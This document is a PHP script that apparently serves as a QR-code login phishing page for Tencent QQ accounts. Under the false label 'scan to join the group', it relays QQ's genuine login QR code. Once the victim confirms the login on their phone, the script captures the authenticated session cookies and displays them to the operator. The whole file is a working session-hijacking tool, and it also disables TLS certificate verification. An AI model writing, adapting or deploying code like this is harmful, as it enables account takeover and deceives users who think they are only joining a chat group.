<?php
session_start();

function curlGetPage($url, $headers = null, $cookies = null){
	$curl = curl_init($url);
	curl_setopt($curl, CURLOPT_HEADER, 1);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, FALSE);
	curl_setopt($curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);
	if($headers != null){
		curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
	}
	if($headers != null){
		curl_setopt($curl, CURLOPT_COOKIE, $cookies); 
	}
	$output = curl_exec($curl);
	if($output == false){
		die(var_dump(curl_error($curl)));
	}
	$headerSize = curl_getinfo($curl, CURLINFO_HEADER_SIZE);
	curl_close($curl);
	return array('header' => substr($output, 0, $headerSize), 'data' => substr($output, $headerSize));
}

function buildCookie($header){
	$array_cookies = array();
	$array_names = array();
	$string_cookie = "";
	
	$array_headers = explode("\r\n",$header);
	foreach ($array_headers as $header) {
		if(preg_match('/Set-Cookie:(.*)$/iU', $header, $matches)){
			$array_each_headers = explode(";",$matches[1]);
			foreach ($array_each_headers as $each_cookies) {
				$name = explode("=",$each_cookies)[0];
				if(!in_array($name, $array_names)){
					array_push($array_names, $name);
					$string_cookie = $string_cookie . $each_cookies . ";";
				}
			}
		}
	}
	return $string_cookie;
}

function hash33($str){
	$e = 0;
	for($i = 0; $i< strlen($str); $i++){
		$e += ($e << 5) + ord(substr($str, $i, 1));
	}
	return ($e & 2147483647);
}

function DJB($str){
	$hash=5381;
	for($i = 0; $i< strlen($str); $i++){
		$hash += ($hash<<5) + ord(substr($str, $i, 1));
	}
	return ($hash & 0x7fffffff);
}

function reBuildCookie($cookies1, $cookies2){
	$cookies = $cookies1 . $cookies2;
	$array_names = array();
	$string_cookie = "";
	
	$array_each_headers = explode(";", $cookies);
	foreach ($array_each_headers as $each_cookies) {
		$name = explode("=",$each_cookies)[0];
		if(!in_array($name, $array_names)){
			array_push($array_names, $name);
			$string_cookie = $string_cookie . $each_cookies . ";";
		}
	}
	return $string_cookie;
}

function getQR(){
	$jumped_url = (isset($_GET['SetTarget']) ? $_GET['SetTarget'] : 'http://www.qq.com/');

	$header = array(
		'Upgrade-Insecure-Requests:1',
		'User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
	);
	
	$first_url = 'http://ui.ptlogin2.qq.com/cgi-bin/login?appid=715030901&daid=73&pt_no_auth=1&s_url=' . $jumped_url;
	$ret_first_url = curlGetPage($first_url, $header);
	if(preg_match('/ptui_version:encodeURIComponent\("(\d+)"\)/', $ret_first_url["data"], $matches)){
		$_SESSION['js_ver'] = $matches[1];
	}else{
		die("Error : js_ver");
	}
	$qr_url = sprintf('http://ptlogin2.qq.com/ptqrshow?appid=715030901&e=2&l=M&s=3&d=72&v=4&t=%.17f&daid=73', mt_rand()/ mt_getrandmax());
	$ret_qrcode = curlGetPage($qr_url, $header, buildCookie($ret_first_url['header']));
	$_SESSION['unverified_cookie'] = reBuildCookie(buildCookie($ret_first_url['header']), buildCookie($ret_qrcode['header']));
	$_SESSION['inited'] = 1;
	header("Content-type: image/png");
	die($ret_qrcode['data']);
}



if(isset($_GET['reset'])){
	unset($_SESSION['inited']);
	die("请刷新页面并再次扫描二维码");
}

if(isset($_GET['GertQR'])){
	die(getQR());
}

if(isset($_SESSION['inited'])){
	
	$jumped_url = (isset($_GET['SetTarget']) ? $_GET['SetTarget'] : 'http://www.qq.com/');
	
	$add_group_url = "shang.qq.com/wpa/qunwpa?idkey=beb01ce09218e6e8629abcd09e78af12a8c6a7c24553641ff52a12a774958a00";

	$header = array(
		'Upgrade-Insecure-Requests:1',
		'User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
	);
	
	if(preg_match('/pt_login_sig=(.*);/iU', $_SESSION['unverified_cookie'], $matches)){
		$login_sig = $matches[1];
	}else{
		die("login_sig");
	}
	if(preg_match('/qrsig=(.*);/iU', $_SESSION['unverified_cookie'], $matches)){
		$qrsig = $matches[1];
	}else{
		die("qrsig");
	}
	if(preg_match('/qrsig=(.*);/iU', $_SESSION['unverified_cookie'], $matches)){
	$qrsig = $matches[1];
	}else{
		die("qrsig");
	}
	$verifylink = 'http://ptlogin2.qq.com/ptqrlogin?u1=' . $jumped_url . '&ptqrtoken=' . hash33($qrsig) . '&ptredirect=1&h=1&t=1&g=1&from_ui=1&ptlang=2052&action=0-0-' . (time() * 1000) . '&js_ver=' . $_SESSION['js_ver'] . '&js_type=1&login_sig=' . $login_sig . '&pt_uistyle=40&aid=715030901&daid=73&';
	$ret_verifylink = curlGetPage($verifylink, $header, $_SESSION['unverified_cookie']);
	
	if(strpos($ret_verifylink['data'],"登录成功")){
		if(preg_match("/(http.*)'/iU", $ret_verifylink['data'], $matches)){
			$final_ret_1 = curlGetPage($matches[1], $header, buildCookie($ret_verifylink['header']));
			$cookie_final = buildCookie($final_ret_1['header']);
			
			if(preg_match('/Location: (.*)\r\n/iU', $final_ret_1['header'], $matches)){
				$geted_target = $matches[1];
			}else{
				die("geted_target");
			}
			echo '<script>window.open("' . $add_group_url . '");</script>';
			die("使用以下cookie [" . $cookie_final . "] 访问 [" . $geted_target . "] 来验证");
			
			exit;
		}else{
			die("login");
		}
	}else if(strpos($ret_verifylink['data'],"二维码未失效")){
		unset($_SESSION['inited']);
		die("请刷新页面并再次扫描二维码");
	}else if(strpos($ret_verifylink['data'],"二维码已失效")){
		unset($_SESSION['inited']);
		die("请刷新页面并再次扫描二维码");
	}else{
		die("请在手机上点击确认并刷新页面");
	}
}else{
	echo '<center><h1>扫码加群[拦截弹窗关了才有效果 = =]</h1><img src="' . $_SERVER['PHP_SELF'] . $_SERVER["REQUEST_URI"] . '?GertQR"></center>';
}
?>
